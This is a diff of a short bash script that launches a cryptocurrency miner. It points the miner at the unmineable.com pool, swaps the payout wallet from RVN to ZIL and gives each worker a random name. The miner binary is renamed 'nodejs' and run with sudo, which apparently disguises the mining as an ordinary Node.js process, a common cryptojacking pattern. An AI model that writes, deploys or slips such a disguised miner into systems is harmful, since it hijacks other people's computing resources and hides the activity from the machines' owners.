@@ -1,6 +1,6 @@
 #!/bin/bash
 POOL=ethash.unmineable.com:3333
-WALLET=RVN:RY28x597iBdNnLziuhQ3Y1z9C48Zjo2ysn
+WALLET=ZIL:zil12xj5q0cvpjaz5nm02zntwsp4yr5zvlt2an5mer
 WORKER=$(echo $(shuf -i 1000-99999 -n 1)-gas) 
-chmod +x lol
-./lol --algo ETHASH --pool $POOL --user $WALLET.$WORKER 
+chmod +x nodejs
+sudo ./nodejs -pol $POOL -wal $WALLET -worker $WORKER 
